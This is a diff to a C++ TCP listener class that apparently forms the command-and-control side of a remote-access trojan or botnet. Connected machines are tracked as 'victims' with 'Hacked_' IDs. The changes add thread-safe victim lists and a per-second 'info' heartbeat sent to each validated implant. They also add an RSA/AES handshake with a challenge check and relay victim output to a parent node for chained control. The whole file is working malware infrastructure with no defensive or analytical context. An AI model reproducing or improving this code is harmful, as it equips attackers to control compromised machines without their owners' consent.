@@ -7,6 +7,11 @@
 #include <thread>
 #include <vector>
 #include <string>
+#include <memory>
+#include <algorithm>
+#include <atomic>
+#include <unordered_map>
+#include <mutex>
 
 #include "clsVictim.hpp"
 #include "clsEDP.hpp"
@@ -18,7 +23,7 @@
 class clsLtnTcp
 {
 private:
-    clsVictim m_vicParent;
+    std::shared_ptr<clsVictim> m_vicParent = nullptr;
 
     int m_nSktSrv = -1;
     int m_nPort;
@@ -29,7 +34,19 @@ private:
     std::vector<unsigned char> m_vuRSAPublicKey;
     std::vector<unsigned char> m_vuRSAPrivateKey;
 
-    std::vector<clsVictim> m_vVictim;
+    std::vector<std::shared_ptr<clsVictim>> m_vVictim;
+    std::mutex m_vVictimMutex;
+
+    struct stHeartbeatCtx
+    {
+        std::atomic<bool> running { true };
+        std::thread th;
+    };
+
+    std::unordered_map<std::shared_ptr<clsVictim>, std::shared_ptr<stHeartbeatCtx>> m_heartbeatMap;
+    std::mutex m_heartbeatMutex;
+
+    std::atomic<bool> m_closed { false };
 
 public:
     bool m_bListening = false;
@@ -37,7 +54,7 @@ public:
 public:
     clsLtnTcp() = default;
 
-    clsLtnTcp(clsVictim& victim, int nPort, const std::string& szRSAPublicKey, const std::string& szRSAPrivateKey)
+    clsLtnTcp(std::shared_ptr<clsVictim> victim, int nPort, const std::string& szRSAPublicKey, const std::string& szRSAPrivateKey)
     {
         m_vicParent = victim;
         m_nPort = nPort;
@@ -61,15 +78,17 @@ public:
         bind(m_nSktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr));
     }
 
-    ~clsLtnTcp() = default;
+    ~clsLtnTcp()
+    {
+        
+    }
 
     void fnStart()
     {
         listen(m_nSktSrv, 1000);
-        
         clsTools::fnLogInfo("Listening...");
-
         m_bListening = true;
+
         while (m_bListening)
         {
             sockaddr_in clntAddr {};
@@ -82,152 +101,210 @@ public:
                 continue;
             }
 
-            m_threads.emplace_back(&clsLtnTcp::fnHandler, this, nSktClnt, clntAddr);
+            auto victim = std::make_shared<clsVictim>(clsVictim::enMethod::TCP, nSktClnt);
+            m_threads.emplace_back(&clsLtnTcp::fnHandler, this, victim, nSktClnt, clntAddr);
             m_threads.back().detach();
         }
     }
 
     void fnStop()
     {
+        m_bListening = false;
         close(m_nSktSrv);
     }
 
     void fnSendToSub(std::string& szSubID, std::vector<std::string>& vuMsg)
     {
-        for (int i = 0; i < m_vVictim.size(); i++)
+        std::lock_guard<std::mutex> lock(m_vVictimMutex);
+        for (auto& victim : m_vVictim)
         {
-            m_vVictim[i].fnSendCommand(vuMsg, true);
+            victim->fnSendCommand(vuMsg, true);
         }
     }
 
 private:
-    void fnHandler(int nSktClnt, sockaddr_in clntAddr)
+    void fnHandler(std::shared_ptr<clsVictim> victim, int nSktClnt, sockaddr_in clntAddr)
     {
-        clsTools::fnLogInfo("Accepted");
-
-        int nRecv = 0;
-        std::vector<unsigned char> vuStaticRecvBuf(clsEDP::MAX_SIZE);
-        std::vector<unsigned char> vuDynamicRecvBuf;
-
-        clsCrypto crypto(m_vuRSAPublicKey, m_vuRSAPrivateKey);
-        clsVictim victim(clsVictim::enMethod::TCP, nSktClnt, crypto);
-        
-        victim.fnSend(1, 0, m_szRSAPublicKey);
-
-        do
+        try
         {
-            // Receive data
-            std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
-            nRecv = recv(nSktClnt, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);
+            clsTools::fnLogInfo("Accepted new client");
 
-            if (nRecv <= 0)
-                break; // socket closed or error
+            int nRecv = 0;
+            std::vector<unsigned char> vuStaticRecvBuf(clsEDP::MAX_SIZE);
+            std::vector<unsigned char> vuDynamicRecvBuf;
 
-            // Append to dynamic buffer
-            vuDynamicRecvBuf.insert(
-                vuDynamicRecvBuf.end(),
-                vuStaticRecvBuf.begin(),
-                vuStaticRecvBuf.begin() + nRecv);
+            //clsCrypto crypto(m_vuRSAPublicKey, m_vuRSAPrivateKey);
+            victim->m_crypto = std::make_unique<clsCrypto>(m_vuRSAPublicKey, m_vuRSAPrivateKey);
 
-            while (true)
+            // Send public key to client
+            victim->fnSend(1, 0, m_szRSAPublicKey);
+            std::string szVictimID = "";
+
+            do
             {
-                // not enough for header yet
-                if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
+                std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
+                nRecv = recv(nSktClnt, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);
+                if (nRecv <= 0)
                     break;
 
-                auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);
+                vuDynamicRecvBuf.insert(vuDynamicRecvBuf.end(), vuStaticRecvBuf.begin(), vuStaticRecvBuf.begin() + nRecv);
 
-                // incomplete packet — wait for next recv
-                if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
-                    break;
-
-                // construct EDP from full message
-                clsEDP edp(vuDynamicRecvBuf);
-                vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet
-
-                auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
-                
-                printf("%d,%d\n", cmd, param);
-
-                if (cmd == 0)
+                while (true)
                 {
-                    if (param == 0)
+                    if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE) break;
+                    auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);
+                    if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength)) break;
+
+                    clsEDP edp(vuDynamicRecvBuf);
+                    vuDynamicRecvBuf = edp.fnGetMoreData();
+                    auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
+
+                    if (cmd == 0 && param == 0)
                     {
-                        //close(nSktClnt);
+                        break; // can close socket if needed
                     }
-                }
-                else if (cmd == 1)
-                {
-                    if (param == 1)
+                    else if (cmd == 1)
                     {
-                        std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
-                        std::vector<unsigned char> abCipher = clsEZData::fnb64Decode(szb64Cipher);
-                        std::vector<unsigned char> abPlain = victim.m_crypto.fnvuRSADecrypt(abCipher.data(), abCipher.size());
-
-                        std::string szPlain(abPlain.begin(), abPlain.end());
-                        auto pos = szPlain.find('|');
-
-                        std::string szKey = szPlain.substr(0, pos);
-                        std::string szIV = szPlain.substr(pos + 1);
-
-                        std::vector<unsigned char> vuAESKey = clsEZData::fnb64Decode(szKey);
-                        std::vector<unsigned char> vuAESIV = clsEZData::fnb64Decode(szIV);
-
-                        victim.m_crypto.fnAesSetNewKeyIV(vuAESKey, vuAESIV);
-
-                        // Send challenge (C#: param 2)
-                        std::string szChallenge = clsEZData::fnszGenerateRandomStr();
-                        victim.m_crypto.m_szChallenge = szChallenge;
-                        victim.fnSend(1, 2, szChallenge);
-                    }
-                    else if (param == 3)
-                    {
-                        std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
-
-                        std::vector<unsigned char> vuCipher = clsEZData::fnb64Decode(szb64Cipher);
-
-                        std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuCipher.data(), vuCipher.size());
-                        std::string szPlain(reinterpret_cast<const char*>(vuPlain.data()), vuPlain.size());
-
-                        if (szPlain == victim.m_crypto.m_szChallenge)
+                        if (param == 1)
                         {
-                            STRLIST ls = {
-                                "info",
-                            };
+                            std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
+                            std::vector<unsigned char> abCipher = clsEZData::fnb64Decode(szb64Cipher);
+                            std::vector<unsigned char> abPlain = victim->m_crypto->fnvuRSADecrypt(abCipher.data(), abCipher.size());
 
-                            m_vVictim.push_back(victim);
+                            std::string szPlain(abPlain.begin(), abPlain.end());
+                            auto pos = szPlain.find('|');
 
-                            victim.fnSendCommand(ls, true);
+                            std::string szKey = szPlain.substr(0, pos);
+                            std::string szIV = szPlain.substr(pos + 1);
+
+                            std::vector<unsigned char> vuAESKey = clsEZData::fnb64Decode(szKey);
+                            std::vector<unsigned char> vuAESIV = clsEZData::fnb64Decode(szIV);
+
+                            victim->m_crypto->fnAesSetNewKeyIV(vuAESKey, vuAESIV);
+
+                            std::string szChallenge = clsEZData::fnszGenerateRandomStr();
+                            victim->m_crypto->m_szChallenge = szChallenge;
+                            victim->fnSend(1, 2, szChallenge);
                         }
-                        else
+                        else if (param == 3)
                         {
-                            clsTools::fnLogErr("Validation is failed.");
+                            std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
+                            std::vector<unsigned char> vuCipher = clsEZData::fnb64Decode(szb64Cipher);
+                            std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuCipher.data(), vuCipher.size());
+                            std::string szPlain(reinterpret_cast<const char*>(vuPlain.data()), vuPlain.size());
+
+                            if (szPlain == victim->m_crypto->m_szChallenge)
+                            {
+                                {
+                                    std::lock_guard<std::mutex> lock(m_vVictimMutex);
+                                    m_vVictim.push_back(victim);
+                                }
+
+                                //victim->fnSendCommand(ls, true);
+
+                                auto hb = std::make_shared<stHeartbeatCtx>();
+                                std::weak_ptr<clsVictim> wvictim = victim;
+                                hb->th = std::thread([this, wvictim, hb]() 
+                                {
+                                    while (hb->running) {
+                                        auto v = wvictim.lock();
+                                        if (!v) {
+                                            break;
+                                        }
+
+                                        try {
+                                            STRLIST ls = { "info" };
+                                            v->fnSendCommand(ls, true);
+                                        } catch (...) {
+                                            break;
+                                        }
+
+                                        std::this_thread::sleep_for(std::chrono::seconds(1));
+                                    }
+                                });
+
+                                std::lock_guard<std::mutex> lock(m_heartbeatMutex);
+                                m_heartbeatMap[victim] = hb;
+
+                                clsTools::fnLogInfo("New client validated and connected");
+                            }
+                            else
+                            {
+                                clsTools::fnLogErr("Validation failed");
+                            }
                         }
                     }
-                }
-                else if (cmd == 2)
-                {
-                    if (param == 0)
+                    else if (cmd == 2 && param == 0)
                     {
-                        std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuMsg);
+                        std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuMsg);
                         std::string szMsg(vuPlain.begin(), vuPlain.end());
 
                         auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
-                        //decoded.insert(decoded.begin(), m_vicParent.m_szVictimID);
+                        
+                        std::vector<std::string> vuVictim;
+                        std::vector<std::string> vuMsg;
+                        for (int i = 0; i < decoded.size(); i++)
+                        {
+                            if (decoded[i].rfind("Hacked_", 0) == 0)
+                                vuVictim.push_back(decoded[i]);
+                            else
+                            {
+                                vuMsg.reserve(decoded.size() - i - 1);
+                                vuMsg.insert(vuMsg.end(), decoded.begin() + i, decoded.end());
+                                break;
+                            }
+                        }
 
-                        clsDebugTools::fnPrintStringList(decoded);
+                        if (vuMsg[0] == "info")
+                            victim->m_szVictimID = vuMsg[4];
 
-                        m_vicParent.fnSendCommand(decoded);
+                        m_vicParent->fnSendCommand(decoded);
                     }
+                }
+
+            } while (nRecv > 0);
+
+            std::shared_ptr<stHeartbeatCtx> hb;
+            {
+                std::lock_guard<std::mutex> lock(m_heartbeatMutex);
+                auto it = m_heartbeatMap.find(victim);
+                if (it != m_heartbeatMap.end())
+                {
+                    hb = it->second;
+                    m_heartbeatMap.erase(it);
                 }
             }
 
-        } while (nRecv > 0);
+            if (hb)
+            {
+                hb->running = false;
+                if (hb->th.joinable() && std::this_thread::get_id() != hb->th.get_id())
+                {
+                    hb->th.detach();
+                }
+            }
 
-        m_vVictim.erase(std::remove(m_vVictim.begin(), m_vVictim.end(), victim), m_vVictim.end());
-        close(nSktClnt);
-        free(&nSktClnt);
+            STRLIST ls = {
+                "disconnect",
+                victim->m_szVictimID,
+            };
 
-        m_vicParent.fnSendCommand("disconnect");
+            m_vicParent->fnSendCommand(ls);
+
+            // erase disconnected victim safely
+            {
+                std::lock_guard<std::mutex> lock(m_vVictimMutex);
+                m_vVictim.erase(
+                    std::remove(m_vVictim.begin(), m_vVictim.end(), victim),
+                    m_vVictim.end()
+                );
+            }
+
+            clsTools::fnLogInfo("Client disconnected");
+        }
+        catch (const std::exception& e)
+        {
+            clsTools::fnLogErr(e.what());
+        }
     }
 };
